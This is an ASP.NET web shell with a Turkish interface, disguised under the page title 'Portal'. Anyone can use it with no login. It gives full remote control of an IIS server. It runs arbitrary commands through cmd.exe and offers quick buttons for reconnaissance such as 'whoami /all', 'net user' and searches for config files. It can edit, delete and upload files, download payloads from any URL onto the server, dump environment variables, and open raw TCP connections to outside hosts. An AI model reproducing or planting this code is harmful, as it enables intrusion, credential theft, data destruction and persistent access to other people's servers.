<%@ Page Language="C#" ValidateRequest="false" EnableEventValidation="false" EnableViewState="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>
<script runat="server">

string G(string k) { return Request.Form[k] ?? Request.QueryString[k] ?? ""; }
string CWD { get { string d = G("d"); return string.IsNullOrEmpty(d) ? Server.MapPath("./") : d; } }
string TAB { get { string t = G("t"); return string.IsNullOrEmpty(t) ? "files" : t; } }
string ME   { get { return Path.GetFileName(Request.Url.AbsolutePath); } }
string MED  { get { return Request.Url.AbsolutePath.Substring(0, Request.Url.AbsolutePath.LastIndexOf('/') + 1); } }
string WHO  { get { try { return System.Security.Principal.WindowsIdentity.GetCurrent().Name; } catch { return "?"; } } }
string BASE { get { return Request.Url.Scheme + "://" + Request.Url.Authority + MED; } }

void Page_Load(object sender, EventArgs e) { }

// ======================== HELPERS ========================
string FS(long b) {
    if (b < 1024) return b + " B";
    if (b < 1048576) return (b / 1024.0).ToString("F1") + " KB";
    if (b < 1073741824) return (b / 1048576.0).ToString("F1") + " MB";
    return (b / 1073741824.0).ToString("F2") + " GB";
}
string MR(string fp) {
    string bp = Server.MapPath("./");
    if (!bp.EndsWith("\\")) bp += "\\";
    if (fp.StartsWith(bp, StringComparison.OrdinalIgnoreCase)) return fp.Substring(bp.Length);
    return fp;
}
string FE(string e) {
    e = e.ToLower();
    if (e == ".aspx"||e == ".asp"||e == ".php"||e == ".jsp") return "&#9881;";
    if (e == ".txt"||e == ".log"||e == ".config"||e == ".ini") return "&#128221;";
    if (e == ".jpg"||e == ".png"||e == ".gif"||e == ".bmp") return "&#128247;";
    if (e == ".zip"||e == ".rar"||e == ".7z"||e == ".tar") return "&#128230;";
    if (e == ".exe"||e == ".dll"||e == ".bat"||e == ".ps1") return "&#9881;";
    if (e == ".sql"||e == ".mdb"||e == ".mdf") return "&#128451;";
    if (e == ".xml"||e == ".json"||e == ".csv") return "&#128203;";
    return "&#128196;";
}
void OK(string m) { Response.Write("<div style='background:#238636;color:#fff;padding:10px 14px;border-radius:4px;margin-bottom:10px;font-weight:bold'>+ " + m + "</div>"); }
void ER(string m) { Response.Write("<div style='background:#da3633;color:#fff;padding:10px 14px;border-radius:4px;margin-bottom:10px;font-weight:bold'>- " + m + "</div>"); }

// ======================== MAIN RENDER ========================
void Render() {
%><!DOCTYPE html>
<html><head><meta charset='UTF-8'><title>Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:13px 'Segoe UI',Tahoma,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
.bar{background:#161b22;border-bottom:1px solid #30363d;padding:10px 18px;display:flex;align-items:center;gap:10px}
.crumb{color:#8b949e;font-size:11px;word-break:break-all;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.main{padding:16px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;margin-bottom:14px}
.chd{background:#21262d;padding:9px 14px;border-bottom:1px solid #30363d;font-weight:bold;font-size:12px;display:flex;justify-content:space-between;align-items:center}
.cbd{padding:14px}
input,select,textarea,button{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:4px;padding:7px 10px;font:12px 'Segoe UI',Tahoma,sans-serif}
button{cursor:pointer;background:#238636;border-color:#2ea043;color:#fff;font-weight:bold}
button:hover{background:#2ea043}
button.r{background:#da3633;border-color:#f85149}
button.r:hover{background:#f85149}
button.b{background:#1f6feb;border-color:#388bfd}
textarea{width:100%;min-height:280px;font:12px Consolas,monospace;resize:vertical;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px}
table{width:100%;border-collapse:collapse}
th,td{padding:7px 10px;text-align:left;border-bottom:1px solid #21262d;font-size:12px}
th{background:#21262d;position:sticky;top:0}
tr:hover{background:#1c2128}
a{color:#58a6ff;text-decoration:none}
a:hover{text-decoration:underline}
pre{background:#0d1117;padding:12px;border-radius:4px;max-height:450px;overflow:auto;white-space:pre-wrap;word-break:break-all;font:12px Consolas,monospace}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.fw{grid-column:1/-1}
.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.row>*{flex:1}
.pill{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;margin:2px;cursor:pointer}
.pg{background:#238636;color:#fff}
.info td{padding:5px 12px 5px 0;font-size:12px}
.info td:first-child{color:#8b949e;width:180px}
.tabs{display:flex;gap:4px;margin-bottom:14px;overflow-x:auto}
.tab{padding:8px 18px;border-radius:4px 4px 0 0;border:1px solid transparent;cursor:pointer;font-size:12px;font-weight:bold;text-decoration:none;white-space:nowrap}
.tab.on{background:#1f6feb;border-color:#388bfd;color:#fff}
.tab.off{background:transparent;color:#8b949e;border-color:#30363d;border-bottom:none}
.tab.off:hover{color:#fff;background:#21262d}
@media(max-width:768px){.grid{grid-template-columns:1fr}}
</style></head><body>
<div class='bar'><span style='color:#fff;font-weight:bold'>Panel</span> <span class='crumb'><%= CWD %></span> <span style='margin-left:auto;font-size:11px;color:#8b949e'><%= WHO %></span></div>
<div class='main'>
<div class='tabs'>
  <a class='tab <%= TAB=="files"?"on":"off" %>' href='?t=files&d=<%= Server.UrlEncode(CWD) %>'>Dosyalar</a>
  <a class='tab <%= TAB=="cmd"?"on":"off" %>' href='?t=cmd&d=<%= Server.UrlEncode(CWD) %>'>Komut</a>
  <a class='tab <%= TAB=="upload"?"on":"off" %>' href='?t=upload&d=<%= Server.UrlEncode(CWD) %>'>Yukleme</a>
  <a class='tab <%= TAB=="info"?"on":"off" %>' href='?t=info&d=<%= Server.UrlEncode(CWD) %>'>Sistem</a>
  <a class='tab <%= TAB=="tools"?"on":"off" %>' href='?t=tools&d=<%= Server.UrlEncode(CWD) %>'>Araclar</a>
</div>
<%
    try {
        if (TAB == "files")  FilesTab();
        else if (TAB == "cmd")    CmdTab();
        else if (TAB == "upload") UploadTab();
        else if (TAB == "info")   InfoTab();
        else if (TAB == "tools")  ToolsTab();
        else FilesTab();
    } catch (Exception ex) {
        Response.Write("<div class='card'><div class='chd'>Hata</div><div class='cbd' style='color:#f85149'>" + Server.HtmlEncode(ex.Message) + "<br><br><pre>" + Server.HtmlEncode(ex.StackTrace) + "</pre></div></div>");
    }
%>
</div>
<script>function cp(t){navigator.clipboard.writeText(t)}</script>
</body></html>
<%
}

// ======================== FILES ========================
void FilesTab() {
    string act = G("act");
    string fp  = G("fp");

    // EDIT
    if (act == "edit" && !string.IsNullOrEmpty(fp) && File.Exists(fp)) {
        string cnt = "";
        try { cnt = File.ReadAllText(fp); } catch { cnt = "[binary/okunamadi]"; }
        %><div class='card'><div class='chd'>Duzenle: <%= Path.GetFileName(fp) %></div>
        <div class='cbd'><form method='post'>
        <input type='hidden' name='t' value='files'><input type='hidden' name='d' value='<%= CWD %>'>
        <input type='hidden' name='act' value='save'><input type='hidden' name='fp' value='<%= Server.HtmlEncode(fp) %>'>
        <textarea name='content'><%= Server.HtmlEncode(cnt) %></textarea><br><br>
        <button>Kaydet</button> <a href='?t=files&d=<%= Server.UrlEncode(CWD) %>'><button type='button' class='r'>Iptal</button></a>
        </form></div></div><% return;
    }
    // SAVE
    if (act == "save" && !string.IsNullOrEmpty(fp)) {
        try { File.WriteAllText(fp, G("content")); OK("Kaydedildi: " + Path.GetFileName(fp)); }
        catch (Exception ex) { ER("Kaydetme hatasi: " + ex.Message); }
    }
    // DELETE FILE
    if (act == "delete" && !string.IsNullOrEmpty(fp) && File.Exists(fp)) {
        try { File.Delete(fp); OK("Silindi: " + Path.GetFileName(fp)); }
        catch (Exception ex) { ER("Silme hatasi: " + ex.Message); }
    }
    // DELETE DIR
    if (act == "deldir" && !string.IsNullOrEmpty(fp) && Directory.Exists(fp)) {
        try { Directory.Delete(fp, true); OK("Klasor silindi"); }
        catch (Exception ex) { ER("Silme hatasi: " + ex.Message); }
    }
    // MKDIR
    if (act == "mkdir") {
        string dn = G("dn");
        if (!string.IsNullOrEmpty(dn)) {
            try { Directory.CreateDirectory(Path.Combine(CWD, dn)); OK("Klasor: " + dn); }
            catch (Exception ex) { ER("Hata: " + ex.Message); }
        }
    }
    // RENAME
    if (act == "rename") {
        string nn = G("nn");
        if (!string.IsNullOrEmpty(fp) && !string.IsNullOrEmpty(nn) && File.Exists(fp)) {
            try { File.Move(fp, Path.Combine(Path.GetDirectoryName(fp), nn)); OK("Ad degisti"); }
            catch (Exception ex) { ER("Hata: " + ex.Message); }
        }
    }

    // FILE TABLE
    int fc = 0; int dc = 0;
    try { fc = Directory.GetFiles(CWD).Length; dc = Directory.GetDirectories(CWD).Length; } catch {}
    %><div class='card'><div class='chd'><span><%= CWD %></span><span style='font-weight:normal;font-size:11px;color:#8b949e'><%= fc %> dosya, <%= dc %> klasor</span></div>
    <div style='padding:0;max-height:500px;overflow:auto'><table>
    <tr><th>Ad</th><th>Tur</th><th>Boyut</th><th>Tarih</th><th style='width:240px'>Islem</th></tr><%
    try {
        if (CWD != Path.GetPathRoot(CWD)) {
            string par = Path.GetDirectoryName(CWD);
            %><tr><td><a href='?t=files&d=<%= Server.UrlEncode(par) %>'>[ .. Ust Dizin ]</a></td><td></td><td></td><td></td><td></td></tr><%
        }
        foreach (string d in Directory.GetDirectories(CWD)) {
            var di = new DirectoryInfo(d);
            %><tr><td><a href='?t=files&d=<%= Server.UrlEncode(d) %>'>&#128193; <%= di.Name %></a></td>
            <td>Klasor</td><td></td><td><%= di.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td><a href='?t=files&d=<%= Server.UrlEncode(CWD) %>&act=deldir&fp=<%= Server.UrlEncode(d) %>' style='color:#f85149' onclick='return confirm("Klasor silinsin mi?")'>Sil</a></td></tr><%
        }
        foreach (string f in Directory.GetFiles(CWD)) {
            var fi = new FileInfo(f);
            string url = BASE + MR(f).Replace("\\", "/");
            %><tr><td><a href='<%= url %>' target='_blank'><%= FE(fi.Extension) %> <%= fi.Name %></a></td>
            <td><%= fi.Extension.TrimStart('.') %></td><td><%= FS(fi.Length) %></td>
            <td><%= fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td>
            <form method='post' style='display:inline'><input type='hidden' name='t' value='files'><input type='hidden' name='d' value='<%= CWD %>'>
            <input type='hidden' name='act' value='edit'><input type='hidden' name='fp' value='<%= f %>'>
            <button style='padding:3px 8px;font-size:11px'>Duzenle</button></form>
            <button style='padding:3px 8px;font-size:11px' class='b' onclick="cp('<%= url %>')">Link</button>
            <a href='?t=files&d=<%= Server.UrlEncode(CWD) %>&act=delete&fp=<%= Server.UrlEncode(f) %>' onclick='return confirm("Silinsin mi?")'><button type='button' style='padding:3px 8px;font-size:11px' class='r'>Sil</button></a>
            </td></tr><%
        }
    } catch (Exception ex) { Response.Write("<tr><td colspan='5'>Dizin okunamadi: " + ex.Message + "</td></tr>"); }
    %></table></div></div>

    <div class='row'>
    <div class='card'><div class='chd'>Yeni Klasor</div><div class='cbd'>
    <form method='post'><input type='hidden' name='t' value='files'><input type='hidden' name='d' value='<%= CWD %>'>
    <input type='hidden' name='act' value='mkdir'>
    <div class='row'><input name='dn' placeholder='Klasor adi'><button>Olustur</button></div></form></div></div>
    <div class='card'><div class='chd'>Ara (wildcard)</div><div class='cbd'>
    <form method='get'><input type='hidden' name='t' value='files'><input type='hidden' name='d' value='<%= Server.UrlEncode(CWD) %>'>
    <div class='row'><input name='q' placeholder='*.config, web.*'><button>Ara</button></div></form></div></div>
    </div><%

    if (!string.IsNullOrEmpty(G("q"))) {
        %><div class='card'><div class='chd'>Arama: <%= G("q") %></div>
        <div style='padding:0;max-height:350px;overflow:auto'><table><%
        try {
            foreach (string f in Directory.GetFiles(CWD, G("q"), SearchOption.AllDirectories))
                Response.Write("<tr><td>&#128196; " + Server.HtmlEncode(MR(f)) + "</td><td>" + FS(new FileInfo(f).Length) + "</td></tr>");
        } catch (Exception ex) { Response.Write("<tr><td>Hata: " + ex.Message + "</td></tr>"); }
        %></table></div></div><%
    }
}

// ======================== COMMAND ========================
void CmdTab() {
    string cmd = G("cmd");
    string out = "";
    if (!string.IsNullOrEmpty(cmd)) {
        try {
            var p = new Process();
            p.StartInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WorkingDirectory = CWD;
            p.Start();
            out = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            if (!p.WaitForExit(30000)) { p.Kill(); out += "\n[!] 30sn timeout - durduruldu"; }
        } catch (Exception ex) { out = "Hata: " + ex.Message; }
    }
    %><div class='card'><div class='chd'>Komut - <%= CWD %></div>
    <div class='cbd'><form method='post'>
    <input type='hidden' name='t' value='cmd'><input type='hidden' name='d' value='<%= CWD %>'>
    <div class='row'><input name='cmd' value='<%= Server.HtmlEncode(cmd) %>' placeholder='whoami, dir, ipconfig...' autofocus><button>Calistir</button></div>
    </form></div></div><%
    if (!string.IsNullOrEmpty(out)) { %><div class='card'><div class='chd'>Cikti</div><div class='cbd'><pre><%= Server.HtmlEncode(out) %></pre></div></div><% }
    %><div class='card'><div class='chd'>Hizli Komutlar</div><div class='cbd'><%
    string[] qc = {"whoami /all","ipconfig /all","systeminfo","netstat -ano","tasklist /svc","net user","net localgroup Administrators","dir C:\\*.aspx /s /b","dir C:\\*.config /s /b","icacls .","driverquery","sc query","powershell Get-ExecutionPolicy"};
    foreach (string c in qc) {
        %><span class='pill pg' style='cursor:pointer' onclick="var x=document.getElementsByName('cmd')[0];x.value='<%= c %>';x.form.submit()"><%= c %></span> <%
    }
    %></div></div><%
}

// ======================== UPLOAD ========================
void UploadTab() {
    if (Request.Files.Count > 0 && Request.Files[0].ContentLength > 0) {
        var f = Request.Files[0];
        string fn = f.FileName;
        if (fn.Contains("\\")) fn = fn.Substring(fn.LastIndexOf("\\") + 1);
        string sp = Path.Combine(CWD, fn);
        try {
            f.SaveAs(sp);
            string url = BASE + MR(sp).Replace("\\", "/");
            OK("Yuklendi: " + fn + " (" + FS(f.ContentLength) + ")<br>Link: <a href='" + url + "' target='_blank'>" + url + "</a>");
        } catch (Exception ex) { ER("Hata: " + ex.Message); }
    }
    if (!string.IsNullOrEmpty(G("url"))) {
        try {
            string url = G("url");
            string fn = Path.GetFileName(new Uri(url).AbsolutePath);
            if (string.IsNullOrEmpty(fn)) fn = "dl_" + DateTime.Now.ToString("yyyyMMddHHmmss");
            using (var wc = new WebClient()) { wc.DownloadFile(url, Path.Combine(CWD, fn)); }
            OK("Indirildi: " + fn);
        } catch (Exception ex) { ER("Hata: " + ex.Message); }
    }
    %><div class='grid'>
    <div class='card'><div class='chd'>Dosya Yukle</div><div class='cbd'>
    <form method='post' enctype='multipart/form-data'>
    <input type='hidden' name='t' value='upload'><input type='hidden' name='d' value='<%= CWD %>'>
    <input type='file' name='f'><br><br><button>Yukle</button>
    </form></div></div>
    <div class='card'><div class='chd'>URL'den Indir</div><div class='cbd'>
    <form method='post'>
    <input type='hidden' name='t' value='upload'><input type='hidden' name='d' value='<%= CWD %>'>
    <input name='url' placeholder='https://...'><br><br><button>Indir</button>
    </form></div></div></div>
    <div class='card'><div class='chd'>Dizin: <%= CWD %></div>
    <div style='padding:0;max-height:250px;overflow:auto'><table><%
    try {
        foreach (string f in Directory.GetFiles(CWD)) {
            var fi = new FileInfo(f);
            %><tr><td><%= fi.Name %></td><td><%= FS(fi.Length) %></td><td><%= fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td></tr><%
        }
    } catch {}
    %></table></div></div><%
}

// ======================== INFO ========================
void InfoTab() {
    %><div class='grid'>
    <div class='card'><div class='chd'>Sunucu</div><div class='cbd'><table class='info'><%
    Response.Write("<tr><td>Host</td><td style='font:11px Consolas,monospace'>" + Environment.MachineName + "</td></tr>");
    Response.Write("<tr><td>OS</td><td style='font:11px Consolas,monospace'>" + Environment.OSVersion + "</td></tr>");
    Response.Write("<tr><td>64-bit</td><td style='font:11px Consolas,monospace'>" + (Environment.Is64BitOperatingSystem ? "Evet" : "Hayir") + "</td></tr>");
    Response.Write("<tr><td>.NET CLR</td><td style='font:11px Consolas,monospace'>" + Environment.Version + "</td></tr>");
    Response.Write("<tr><td>IIS</td><td style='font:11px Consolas,monospace'>" + Request.ServerVariables["SERVER_SOFTWARE"] + "</td></tr>");
    Response.Write("<tr><td>Kullanici</td><td style='font:11px Consolas,monospace'>" + WHO + "</td></tr>");
    Response.Write("<tr><td>Uptime</td><td style='font:11px Consolas,monospace'>" + TimeSpan.FromMilliseconds(Environment.TickCount).ToString(@"d\d\ hh\:mm") + "</td></tr>");
    Response.Write("<tr><td>Islemci</td><td style='font:11px Consolas,monospace'>" + Environment.ProcessorCount + " cekirdek</td></tr>");
    %></table></div></div>

    <div class='card'><div class='chd'>Ag</div><div class='cbd'><table class='info'><%
    Response.Write("<tr><td>Yerel IP</td><td style='font:11px Consolas,monospace'>" + Request.ServerVariables["LOCAL_ADDR"] + "</td></tr>");
    Response.Write("<tr><td>Uzak IP</td><td style='font:11px Consolas,monospace'>" + Request.ServerVariables["REMOTE_ADDR"] + "</td></tr>");
    Response.Write("<tr><td>Host</td><td style='font:11px Consolas,monospace'>" + Request.ServerVariables["HTTP_HOST"] + "</td></tr>");
    Response.Write("<tr><td>Port</td><td style='font:11px Consolas,monospace'>" + Request.ServerVariables["SERVER_PORT"] + "</td></tr>");
    Response.Write("<tr><td>HTTPS</td><td style='font:11px Consolas,monospace'>" + (Request.IsSecureConnection ? "Evet" : "Hayir") + "</td></tr>");
    %></table></div></div>

    <div class='card'><div class='chd'>Disk</div><div class='cbd'><table class='info'><%
    foreach (DriveInfo d in DriveInfo.GetDrives()) {
        if (d.IsReady)
            Response.Write("<tr><td>" + d.Name + "</td><td style='font:11px Consolas,monospace'>" + FS(d.TotalFreeSpace) + " bos / " + FS(d.TotalSize) + "</td></tr>");
    }
    %></table></div></div>

    <div class='card fw'><div class='chd'>Ortam Degiskenleri</div>
    <div class='cbd' style='max-height:280px;overflow:auto'><table class='info'><%
    foreach (DictionaryEntry ev in Environment.GetEnvironmentVariables()) {
        string v = ev.Value.ToString();
        if (v.Length > 120) v = v.Substring(0, 120) + "...";
        Response.Write("<tr><td>" + ev.Key + "</td><td style='font:11px Consolas,monospace;word-break:break-all'>" + v + "</td></tr>");
    }
    %></table></div></div></div><%
}

// ======================== TOOLS ========================
void ToolsTab() {
    string tool = G("tool");
    string data = G("data");
    string host = G("host");
    string port = G("port");
    string out = "";

    if (!string.IsNullOrEmpty(data) || !string.IsNullOrEmpty(host)) {
        try {
            if (tool == "b64e")      out = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
            else if (tool == "b64d")  out = Encoding.UTF8.GetString(Convert.FromBase64String(data));
            else if (tool == "hex")   out = BitConverter.ToString(Encoding.UTF8.GetBytes(data)).Replace("-", " ");
            else if (tool == "md5")   out = BitConverter.ToString(System.Security.Cryptography.MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(data))).Replace("-", "").ToLower();
            else if (tool == "sha1")  out = BitConverter.ToString(System.Security.Cryptography.SHA1.Create().ComputeHash(Encoding.UTF8.GetBytes(data))).Replace("-", "").ToLower();
            else if (tool == "sha256") out = BitConverter.ToString(System.Security.Cryptography.SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(data))).Replace("-", "").ToLower();
            else if (tool == "urlenc") out = Server.UrlEncode(data);
            else if (tool == "urldec") out = Server.UrlDecode(data);
            else if (tool == "rev")   { char[] arr = data.ToCharArray(); Array.Reverse(arr); out = new string(arr); }
            else if (tool == "dns")   out = string.Join("\n", Dns.GetHostAddresses(data).Select(ip => ip.ToString()));
            else if (tool == "wget")  { using (var wc = new WebClient()) { out = wc.DownloadString(data); } }
            else if (tool == "conn") {
                using (var tcp = new System.Net.Sockets.TcpClient(host, int.Parse(port)))
                using (var ns = tcp.GetStream())
                using (var sw = new StreamWriter(ns) { AutoFlush = true })
                using (var sr = new StreamReader(ns)) {
                    if (!string.IsNullOrEmpty(data)) sw.WriteLine(data);
                    out = sr.ReadToEnd();
                }
            }
        } catch (Exception ex) { out = "Hata: " + ex.Message; }
    }

    %><div class='grid'>
    <div class='card fw'><div class='chd'>Kodlayicilar / Ceviriciler</div>
    <div class='cbd'><form method='post'>
    <input type='hidden' name='t' value='tools'><input type='hidden' name='d' value='<%= CWD %>'>
    <textarea name='data' placeholder='Metin girin...'><%= Server.HtmlEncode(data) %></textarea><br><br>
    <div class='row'>
      <select name='tool'>
        <option value='b64e'>Base64 Encode</option><option value='b64d'>Base64 Decode</option>
        <option value='hex'>Hex</option><option value='md5'>MD5</option>
        <option value='sha1'>SHA1</option><option value='sha256'>SHA256</option>
        <option value='urlenc'>URL Encode</option><option value='urldec'>URL Decode</option>
        <option value='rev'>Reverse</option>
      </select>
      <button>Isle</button>
    </div></form>
    <% if (!string.IsNullOrEmpty(out) && tool != "conn" && tool != "dns" && tool != "wget") { %>
    <br><div class='card'><div class='chd'>Sonuc</div><div class='cbd'><pre><%= Server.HtmlEncode(out) %></pre></div></div><% } %>
    </div></div>

    <div class='card'><div class='chd'>TCP Baglanti</div><div class='cbd'>
    <form method='post'><input type='hidden' name='t' value='tools'><input type='hidden' name='d' value='<%= CWD %>'><input type='hidden' name='tool' value='conn'>
    <input name='host' placeholder='Host/IP' style='margin-bottom:6px'>
    <input name='port' placeholder='Port' style='margin-bottom:6px'>
    <textarea name='data' placeholder='Veri (bos birakilabilir)' style='min-height:60px'><%= Server.HtmlEncode(data) %></textarea><br><br>
    <button>Baglan</button></form>
    <% if (!string.IsNullOrEmpty(out) && tool == "conn") { %>
    <br><div class='card'><div class='chd'>Yanit</div><div class='cbd'><pre><%= Server.HtmlEncode(out) %></pre></div></div><% } %>
    </div></div>

    <div class='card'><div class='chd'>DNS & HTTP</div><div class='cbd'>
    <form method='post'><input type='hidden' name='t' value='tools'><input type='hidden' name='d' value='<%= CWD %>'>
    <input name='data' placeholder='domain.com veya https://...'>
    <div class='row' style='margin-top:6px'>
      <button name='tool' value='dns'>DNS Coz</button>
      <button name='tool' value='wget'>HTTP GET</button>
    </div></form>
    <% if (!string.IsNullOrEmpty(out) && (tool == "dns" || tool == "wget")) { %>
    <br><div class='card'><div class='chd'>Sonuc</div><div class='cbd'><pre><%= Server.HtmlEncode(out) %></pre></div></div><% } %>
    </div></div>
    </div><%
}
</script>
